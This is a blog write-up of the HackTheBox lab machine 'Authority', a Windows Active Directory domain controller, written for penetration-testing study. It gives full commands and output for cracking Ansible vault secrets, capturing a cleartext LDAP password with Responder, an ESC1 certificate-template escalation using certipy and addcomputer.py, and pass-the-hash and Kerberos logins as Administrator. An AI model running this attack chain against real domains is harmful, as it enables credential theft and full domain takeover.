+++
date = "2026-04-02"
draft = false
title = "Authority - HackTheBox"
categories = ["Pentesting", "HackTheBox", "OSCP", "CPTS", "Windows"]
tags = ["nmap", "smbclient", "netexec", "dig", "hashcat", "responder", "evil-winrm", "certipy", "addcomputer.py" , "impacket-wmiexec"]
summary = "Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain."
+++

## Summery
Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.

## Enumeration
I didn't get any credentials assumed breach style

#### nmap
Let's start with a simple nmap enumeration.<br>
`sudo nmap -sC -sV -O -Pn 10.129.20.218; sleep 5; sudo nmap -p- -Pn 10.129.20.218; sleep 5; sudo nmap -sU 10.129.20.218`
{{< accordion >}}
  {{< accordionItem title="nmap scan results" icon="code">}}
    Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-01 19:17 CEST
    Nmap scan report for authority.htb.corp (10.129.20.218)
    Host is up (0.029s latency).
    Not shown: 986 closed tcp ports (reset)
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain        Simple DNS Plus
    80/tcp   open  http          Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: IIS Windows Server
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-01 21:17:09Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
    | ssl-cert: Subject: 
    | Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
    | Not valid before: 2022-08-09T23:03:21
    |_Not valid after:  2024-08-09T23:13:21
    |_ssl-date: 2026-04-01T21:18:10+00:00; +4h00m00s from scanner time.
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
    |_ssl-date: 2026-04-01T21:18:10+00:00; +4h00m00s from scanner time.
    | ssl-cert: Subject: 
    | Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
    | Not valid before: 2022-08-09T23:03:21
    |_Not valid after:  2024-08-09T23:13:21
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
    | ssl-cert: Subject: 
    | Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
    | Not valid before: 2022-08-09T23:03:21
    |_Not valid after:  2024-08-09T23:13:21
    |_ssl-date: 2026-04-01T21:18:10+00:00; +4h00m00s from scanner time.
    3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
    |_ssl-date: 2026-04-01T21:18:10+00:00; +4h00m00s from scanner time.
    | ssl-cert: Subject: 
    | Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
    | Not valid before: 2022-08-09T23:03:21
    |_Not valid after:  2024-08-09T23:13:21
    5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    8443/tcp open  ssl/http      Apache Tomcat (language: en)
    |_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=172.16.2.118
    | Not valid before: 2026-03-30T14:07:45
    |_Not valid after:  2028-04-01T01:46:09
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.95%E=4%D=4/1%OT=53%CT=1%CU=42908%PV=Y%DS=2%DC=I%G=Y%TM=69CD5352
    OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=103%TI=I%CI=I%II=I%SS=S%TS=U
    OS:)SEQ(SP=107%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=108%GCD=1%ISR=
    OS:108%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=FD%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S
    OS:%TS=U)SEQ(SP=FF%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M4E2NW8NNS
    OS:%O2=M4E2NW8NNS%O3=M4E2NW8%O4=M4E2NW8NNS%O5=M4E2NW8NNS%O6=M4E2NNS)WIN(W1=
    OS:FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=
    OS:M4E2NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
    OS:T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S
    OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(
    OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
    OS:N%T=80%CD=Z)

    Network Distance: 2 hops
    Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: mean: 4h00m00s, deviation: 0s, median: 3h59m59s
    | smb2-time: 
    |   date: 2026-04-01T21:18:05
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled and required

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 69.14 seconds
    Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-01 19:18 CEST
    Nmap scan report for authority.htb.corp (10.129.20.218)
    Host is up (0.029s latency).
    Not shown: 65506 closed tcp ports (reset)
    PORT      STATE SERVICE
    53/tcp    open  domain
    80/tcp    open  http
    88/tcp    open  kerberos-sec
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    389/tcp   open  ldap
    445/tcp   open  microsoft-ds
    464/tcp   open  kpasswd5
    593/tcp   open  http-rpc-epmap
    636/tcp   open  ldapssl
    3268/tcp  open  globalcatLDAP
    3269/tcp  open  globalcatLDAPssl
    5985/tcp  open  wsman
    8443/tcp  open  https-alt
    9389/tcp  open  adws
    47001/tcp open  winrm
    49664/tcp open  unknown
    49665/tcp open  unknown
    49666/tcp open  unknown
    49667/tcp open  unknown
    49673/tcp open  unknown
    49690/tcp open  unknown
    49691/tcp open  unknown
    49693/tcp open  unknown
    49694/tcp open  unknown
    49703/tcp open  unknown
    49714/tcp open  unknown
    52328/tcp open  unknown
    59600/tcp open  unknown

    Nmap done: 1 IP address (1 host up) scanned in 44.21 seconds
  {{< /accordionItem >}}
{{< /accordion >}}

From this scan I can see a lot of Windows Domain related ports and a domain name so I will input that info into /etc/hosts with `sudo vim /etc/hosts`

#### SMB
Let's start with SMB, I can see that I have access to two shares `Development` and `IPC$` however after accessing the latter I wasn't able to really look into it so let's focus on the first one.
```
pride@parrot (~): netexec smb 10.129.20.218 --shares -u guest -p ''
	Share           Permissions     Remark
	-----           -----------     ------
	ADMIN$                          Remote Admin
	C$                              Default share
	Department Shares                 
	Development     READ            
	IPC$            READ            Remote IPC
	NETLOGON                        Logon server share 
	SYSVOL                          Logon server share 
```



In Development I found Ansible holding four folders showing basic automation setup. Ansible is a general use, automation tool for admins. I looked through it manually and also run some greps to look for passwords, creds, secrets and generally interesting data `grep -R "pass"`. I found a lot of credentials of many kinds, even a bit of an overwhelming amount.
To complete enumeration of possible users I also started a rid bruteforce to check known users on the host.
`netexec smb 10.129.20.218 -u guest -p '' --rid-brute`
```
SMB         10.129.20.218   445    AUTHORITY        498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        500: HTB\Administrator (SidTypeUser)
SMB         10.129.20.218   445    AUTHORITY        501: HTB\Guest (SidTypeUser)
SMB         10.129.20.218   445    AUTHORITY        502: HTB\krbtgt (SidTypeUser)
SMB         10.129.20.218   445    AUTHORITY        512: HTB\Domain Admins (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        513: HTB\Domain Users (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        514: HTB\Domain Guests (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        515: HTB\Domain Computers (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        516: HTB\Domain Controllers (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        517: HTB\Cert Publishers (SidTypeAlias)
SMB         10.129.20.218   445    AUTHORITY        518: HTB\Schema Admins (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        519: HTB\Enterprise Admins (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        520: HTB\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        521: HTB\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        522: HTB\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        525: HTB\Protected Users (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        526: HTB\Key Admins (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        527: HTB\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        553: HTB\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.20.218   445    AUTHORITY        571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.20.218   445    AUTHORITY        572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.20.218   445    AUTHORITY        1000: HTB\AUTHORITY$ (SidTypeUser)
SMB         10.129.20.218   445    AUTHORITY        1101: HTB\DnsAdmins (SidTypeAlias)
SMB         10.129.20.218   445    AUTHORITY        1102: HTB\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.20.218   445    AUTHORITY        1601: HTB\svc_ldap (SidTypeUser)
```
A bit surprising, there are no real users, maybe besides `svc_ldap`.

#### DNS
After that, I went and looked into DNS to learn more about the domain itself. I didn't find much interesting information but I did notice that the name server was marked as `authority.authority.htb` which is a weird naming convention, nonetheless I added it to the `/etc/hosts`.
```
dig @authority.htb.comp 10.129.20.218 NS
<SNIP>
;; ANSWER SECTION:
authority.htb.		3600	IN	NS	authority.authority.htb.
```

HTTP port leads only to the default IIS website. I didn't enumerate directories or subdomains, however it could be a good option if I wouldn't find other promising vectors to pivot.

In Tomcat, I was greeted with this notice
```
PWM is currently in configuration mode. This mode allows updating the configuration without authenticating to an LDAP directory first. End user functionality is not available in this mode.

After you have verified the LDAP directory settings, use the Configuration Manager to restrict the configuration to prevent unauthorized changes. After restricting, the configuration can still be changed but will require LDAP directory authentication first.
```
PWM is a pretty popular authentication tool for Tomcat. It's clearly is not setup correctly and it doesn't allow me to use LDAP to authenticate. Due to it being in the configuration mode, there are other ways to authenticate.

Within them, I see another user, and also another IP.
```
CN=svc_pwm,CN=Users,DC=htb,DC=corp (default) 	March 26, 2023 at 1:20:39 PM GMT 	10.129.204.183
n/a 	April 23, 2023 at 10:06:34 PM GMT 	
```

I can't sign-in to the tomcat itself because and I get prompted with this information.
```
Directory unavailable. If this error occurs repeatedly please contact your help desk.  
5017 ERROR_DIRECTORY_UNAVAILABLE (all ldap profiles are unreachable; errors: ["error connecting as proxy user: unable to create connection: unable to connect to any configured ldap url, last error: unable to bind to ldaps://authority.authority.htb:636 as CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb reason: CommunicationException (authority.authority.htb:636; PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target)"])
```

I also can't sign-in to the configuration page - I get the following  error.
```
Password incorrect. Please try again.&lt;span class="errorDetail"&gt; { 5089 ERROR_PASSWORD_ONLY_BAD }&lt;/span&gt;<span class="errorDetail"> { 5089 ERROR_PASSWORD_ONLY_BAD }</span> { 5089 ERROR_PASSWORD_ONLY_BAD } 5089 ERROR_PASSWORD_ONLY_BAD
```

After trying multiple combinations of credentials I went back into the Ansible files which I downloaded locally with `prompt OFF`, `recurse ON` and `mget *` within the `smbclient`. In the PWM folder I found these hashes which turned out to be encrypted ansible blobs.
```
pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

It turns out, it's possible to crack them up with `ansible2john`, however it took some editing. [This video](https://www.linkedin.com/posts/rflemen_how-to-decrypt-an-ansible-vault-activity-7301318643492007937-5wde) helped me to make sure my syntax worked with hashcat. I then users `hashcat -m 16900` to crack them and I got `!@#$%^&*`. I wasn't able to find the one specific vault, I only found the file the hashes were in using `grep -R "$ANSIBLE_VAULT;1.1;AES256"` (each ansible vault does start with this specific string). After that I just went over each hash file and decrypt it with `ansible-vault view ansible1.hash --vault-password-file ansible-vault.pass`. A note to take for sure is that Ansible is pretty picky with it's syntax.  
After the decryption we got the following information.
```
pwm_admin_login: svc_pwm
pwm_admin_password: pWm_@dm!N_!23
ldap_admin_password: DevT3st@123
```
## Foothold
### svc_pwm
With them, I wasn't able to auth into LDAP of course, but I could enter the PWN login.

After I looked through the dashboard I noticed I was able to download a copy of the local database called `PWM-LocalDB.bak`.
From the configuration files and my instinct I think the point of the `authority.authority.htb` is just to make tomcat misconfigured and simply changing it to `authority.htb` would fix the issue.
If there will not be any interesting data in the databse itself, there is also a way to upload a database. We know that the file would go into `c:\pwm\LocalDB` which could be used for a webshell if the file verification is weak.

The process to extract data from the MSSQL backup binary on linux would be quite hard, I will leave it for the time being and try that webshell idea first.
As this runs Tomcat which uses Java I should look into Java JSP or maybe lastly ASP shells.

I tried to install a rev_shell with the `.jsp` extension, PWN does require it to be a GZIP format. I tried double extensions, changing the extension in BurpSuite as well as adjusting the content-type however I wasn't able to upload it.

I moved around and found that there are another import/upload options for the configuration file itself. I downloaded the configuration file and looked through it. Below are some very interesting finds.
```
<property key="configPasswordHash">
$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua
</property>

<value>
CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
</value>

<value>
ENC-PW:2G7ASAs2W4Y/XTfVMSsRtxxneQpeWaKaQaNsaIToSKlyqC1dVT2VXcqc1h3SiYtMTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=
</value>

<setting key="pwm.securityKey" modifyTime="2022-08-11T01:46:23Z" syntax="PASSWORD" syntaxVersion="0">
<label>
Settings ⇨ Security ⇨ Application Security ⇨ Security Key
</label>
<value>
ENC-PW:7AJ39Hy6+a56Y3ppsO0J0KIXAFF7CBwO5IBODlXvH5gSmELLNpTgnWcbu5s/vU4JKue/Um6dkZm1RrcECBHk358zc045rDyFL2fDku2kusl79NE+Tww8gC8QQ0CX+VS2yyD46+ZS6Jriyu1Y7BOXnJifXXXsHzTmBTkodvnY33V6Puc0Zze0PGYHN+CGFtx/g5WaBTQbQwZwNLA+8Qe11GqCz+rBjGzQp0w6yLHJn+ZYBlLWgvZwN2KUHOiUIq5eKKDgjv+mga4zcB1STcpMJRaIiSnLdY3VCfsEj6p4BGz9jj+N7gQHBFAvI05JexXq8HyL7ZUEzLXU5FMQXvhhWSbhxoz7LH/iamvoOg13WnI3MRUzrXv91Uh7gdNZuXa1NmSBOe/g1GgmFV+0sxLIJ/99VT+GHIwrfjPNNV6jtKHhURPwp0a38c6aBGjpvB3AgAoZ0/KVLvQK1pAevO4NK2XFF2nPD8gQCQJMCsb62I+XMitkO2zKytrYEwZhl9VUGF0bAXQhC5I9xX1tEQAGBcENt1NGfM8iE+PlrZWwlr1yDjw+GZEm2KHyjnUFpBubqD7l7mvEJbEV26SQkR0v4R5LSEPbElOKGbGXMKkDEi53SQ5P0ZZQbega9XtBOHs+/s1EZ4p/qGVCvpD9dgc0SyS0auXU0PUddjxyXthHdqRbEWHhAduXYQgXF0eM2yWlbd7fTgSUMERlpjdFX/QZG3D6Ghp+iOCwfelEfKMQDO1myQcpq5YTE94YDz+aSWvi7ZGRIq+hRkwuR8E0EbEUE7CApDwF3LjGi+UEd9Y3Q9SPSMVxg4Ra2FB4sYCT19N7KV3TpGvJYD4SE8Mrn0cH9ihvlvDJFOxoLC9xM8FA9EAvSZN1w6lV4pUsVpUSM0LRKLqCmBCRJvaRNbhRymM96NFSSi4PwCCJQ7WVJjiS+oLQ+7qwHhqLQFy0+gtkGSQnBoq1FMYSCyGz/fUG84Xe0CSTPt4SwTq+L2M2jqsiB+HXq1z2LdkAFo6xm1Mqs6H/x5ZP1esjvRxDzHod31jRizu+rJw4LNRb172A36dQWmiq/OJQBJrnPu87s+KmoNyCJGrT2+1QttMgM62qy2/Eb6xByQ8RiLl6v87vf24TuWhxJhXfNWMRuHXJp2IWt5BWAYdiQNUjCuvRhfiyxsIqelpEpsOnm8WDVEsN0hqaEt9Db2e/d3Wpx1as4luVtA/MZtKy+gsH0qZUmouj7LCfN5TJpm00MiBTxYSkapKvAGchkE4UVc3AHGIxeyy+t2LwqT9fDSlS/VofOELNcQD3OfPi+asOrgaqcRbZVXdQumoJsubLMiPpHTZtOH2Nt13cEh9ZG/XebrAkchsMjsyLo5KX0nL6RKbMNUA3BmM2cd+bjj+Jar2aeAeqBdW+LU5ALshAsF986N1BGSsQ8aZkJwLi3PUYG8vGR88ZqEMMziQ=
</value>
</setting>
```

Given that the found user is `svc_ldap` I think this is the path I should follow further.
We got an encrypted hash of a password as well as a security key of some kind, let's read up on them.
So form I have gathered:
This is a bcrypt password hash
`$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua`

This is a PWM master key
```
7AJ39Hy6+a56Y3ppsO0J0KIXAFF7CBwO5IBODlXvH5gSmELLNpTgnWcbu5s/vU4JKue/Um6dkZm1RrcECBHk358zc045rDyFL2fDku2kusl79NE+Tww8gC8QQ0CX+VS2yyD46+ZS6Jriyu1Y7BOXnJifXXXsHzTmBTkodvnY33V6Puc0Zze0PGYHN+CGFtx/g5WaBTQbQwZwNLA+8Qe11GqCz+rBjGzQp0w6yLHJn+ZYBlLWgvZwN2KUHOiUIq5eKKDgjv+mga4zcB1STcpMJRaIiSnLdY3VCfsEj6p4BGz9jj+N7gQHBFAvI05JexXq8HyL7ZUEzLXU5FMQXvhhWSbhxoz7LH/iamvoOg13WnI3MRUzrXv91Uh7gdNZuXa1NmSBOe/g1GgmFV+0sxLIJ/99VT+GHIwrfjPNNV6jtKHhURPwp0a38c6aBGjpvB3AgAoZ0/KVLvQK1pAevO4NK2XFF2nPD8gQCQJMCsb62I+XMitkO2zKytrYEwZhl9VUGF0bAXQhC5I9xX1tEQAGBcENt1NGfM8iE+PlrZWwlr1yDjw+GZEm2KHyjnUFpBubqD7l7mvEJbEV26SQkR0v4R5LSEPbElOKGbGXMKkDEi53SQ5P0ZZQbega9XtBOHs+/s1EZ4p/qGVCvpD9dgc0SyS0auXU0PUddjxyXthHdqRbEWHhAduXYQgXF0eM2yWlbd7fTgSUMERlpjdFX/QZG3D6Ghp+iOCwfelEfKMQDO1myQcpq5YTE94YDz+aSWvi7ZGRIq+hRkwuR8E0EbEUE7CApDwF3LjGi+UEd9Y3Q9SPSMVxg4Ra2FB4sYCT19N7KV3TpGvJYD4SE8Mrn0cH9ihvlvDJFOxoLC9xM8FA9EAvSZN1w6lV4pUsVpUSM0LRKLqCmBCRJvaRNbhRymM96NFSSi4PwCCJQ7WVJjiS+oLQ+7qwHhqLQFy0+gtkGSQnBoq1FMYSCyGz/fUG84Xe0CSTPt4SwTq+L2M2jqsiB+HXq1z2LdkAFo6xm1Mqs6H/x5ZP1esjvRxDzHod31jRizu+rJw4LNRb172A36dQWmiq/OJQBJrnPu87s+KmoNyCJGrT2+1QttMgM62qy2/Eb6xByQ8RiLl6v87vf24TuWhxJhXfNWMRuHXJp2IWt5BWAYdiQNUjCuvRhfiyxsIqelpEpsOnm8WDVEsN0hqaEt9Db2e/d3Wpx1as4luVtA/MZtKy+gsH0qZUmouj7LCfN5TJpm00MiBTxYSkapKvAGchkE4UVc3AHGIxeyy+t2LwqT9fDSlS/VofOELNcQD3OfPi+asOrgaqcRbZVXdQumoJsubLMiPpHTZtOH2Nt13cEh9ZG/XebrAkchsMjsyLo5KX0nL6RKbMNUA3BmM2cd+bjj+Jar2aeAeqBdW+LU5ALshAsF986N1BGSsQ8aZkJwLi3PUYG8vGR88ZqEMMziQ=
```

This is a PWM encrypted password
`2G7ASAs2W4Y/XTfVMSsRtxxneQpeWaKaQaNsaIToSKlyqC1dVT2VXcqc1h3SiYtMTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=`

I don't know how to decrypt the PWM's blob with the master key, so I will go first with the bcrypt. I added it into a file and ran `hashcat -m 3200 pwm.bcrypt /usr/share/wordlists/rockyou.txt`
When I started to decrypt it it showed me it will over a day (bcrypt is designed to be hard to crack). In turn, I will use a much smaller wordlists and look for other ways to pivot.

There are ways to decrypt the encrypted blob but I don't want to run unsure git tools and GPT's recommendations are similarly uncertain.

### svc_ldap
Looking for other options I just realized that configuration "Manager" and "Editor" are not the same thing. There is a lot of data and settings in the editor that seem like interesting vectors.

In the configuration file I downloaded from the manager I tried to derive the password and found out that svc_ldap is the proxy username. I can see the same information in the editor however I can change it there. I can see, that LDAP is running in LDAPS. I wonder If i change it will i break the box or will I be able to pull some unencrypted data from the configuration.xml this time.

I changed `ldaps://authority.authority.htb:636` to `ldap://authority.authority.htb:389`, saved the changes, went into the manager and collected the configuration file but it didn't change it then.
As the editor allows us to change the LDAP URL as well as the protocol itself. I decided to try and spit up Responder with `sudo responder -I tun0` and after I edited the details and saved the changes I clicked "Test LDAP Profile".

This caused the website to authenticate to my server and because I changed it from LDAPS to LDAP password came in clear text.
``` Responder
[LDAP] Cleartext Client   : 10.129.20.218
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

Then, I checked if I can authenticate to anything with the new credentials using netexec.
`netexec smb 10.129.20.218 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'`
`netexec winrm 10.129.20.218 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'`


## Privilage Escalation
### Administrator
Seeing that I can access WinRM I used evil-winrm to do so.
`evil-winrm -i authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'`

I did some manual enumeration for possible priv-esc vectors but I wasn't able to find anything of use. 
I looked through the PWM files, SMB shares ald user's files. I downloaded PWM and it's configuration locally thinking that maybe I could use it to decrypt the blob with it and the master key I still have but I wasn't able to figure out how to do it without setting up the whole software on my PC. 

#### Certipy
I thought of running WinPEAS, BloodHound and Certipy so I started with the latter.
`certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -vulnerable -target 10.129.20.218 -dc-ip 10.129.20.218 -stdout`

The output showed me that there is an ESC1 vulnerable template called CorpVPN.
ESC1 is the first of a number of escalation attacks to ADCS. This one simply enabled you to pretend to be someone else. You request a certificate and choose the identity inside of it like Admin. The CA trusts you and signs it, so you get a valid login as that user.
Requirements for it to work:
1. Enrollee Supplies Subject = True
2. Client Authentication = True (or a few others)
3. "User Enrollable Principals" showing a group your user is a part of
4. Requires Manager Approval = False
5. Authorized Signatures Required = 0

I tried to run it with the existing user like this `certipy req -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip '10.129.20.218' -target 'AUTHORITY-CA' -ca 'authority.authority.htb' -template 'CorpVPN' -upn 'administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500'` but I just later noticed that the user is not a part of any group the template is assigned for.

The only group that is not highly-privileged and can use this template is Domain Computers.
Often domain users are able to create a given number of computer hosts which is dictated by a quota parameter - you can quickly check it with netexec.
```
pride@parrot (~/Desktop): netexec ldap 10.129.20.218 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
LDAP        10.129.20.218   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never) 
LDAP        10.129.20.218   389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
MAQ         10.129.20.218   389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.129.20.218   389    AUTHORITY        MachineAccountQuota: 10
```
Note: this method works only if you use ldap with netexec.

#### addcomputer.py
This shows us that svc_ldap can add 10 machines total - let's add one with impacket.
`addcomputer.py authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -dc-ip 10.129.20.218 -computer-name azaeir$ -computer-pass azaeir`.

Let's check if it was added correctly on the host with `Get-ADObject -Filter 'Name -eq "azaeir"' -Properties *`.

Assuming, computer account is in Domain Computers group by default we can now run the edited certipy request.
Weirdly enough I had a lot of trouble getting the `.pfx` file still. After a lot of troubleshooting it turns out that i had to specify `-method LDAPS` in my addcomputer.py command for it to work like so:
```
addcomputer.py authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -method LDAPS -dc-ip 10.129.20.218 -computer-name azaeir1$ -computer-pass azaeir
```
I assume this could be because normal computer account creation uses SAMR and when I specify LDAPs if provides proper attributes and trust behavior is set correctly for certipy - just a theory. Both methods added the account to the Domain Computers group.

Anyway, now I could generate that administrator file.
`certipy req -username 'azaeir1$' -password azaeir -ca AUTHORITY-CA -dc-ip 10.129.20.218 -template CorpVPN -upn administrator@authority.htb -dns authority.htb -debug`

This command also works
`certipy req -u 'azaeir1$@authority.htb' -p 'azaeir' -dc-ip '10.129.20.218' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb' -target authority.authority.htb -target-ip 10.129.20.218`

I adjusted my time using `sudo ntpdate authority.htb` and ran `certipy auth -pfx administrator.pfx -dc-ip 10.129.20.218` to get the TGT as well as NTLM hash.
```
TGT: administrator.ccache
NTLM: aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed
```

As both Kerberos and NTLM are allowed on the host we have two way sto authenticate.
With NTLM we get the NT hash and run `evil-winrm -i authority.htb -u administrator -H 6961f422924da90a6928197429eea4ed`

With Kerberos:
1. Check if you don't have any unexpected tickets assigned with `klist`
2. Change the kerberos cache you're using with `export KRB5CCNAME=administrator.ccache` and double check if it worked with `echo $KRB5CCNAME` and `klist`
3. run one of impacket tools that suits the ports you have access `impacket-wmiexec -k -no-pass AUTHORITY.HTB/Administrator@authority.authority.htb`

## Closing Thoughts
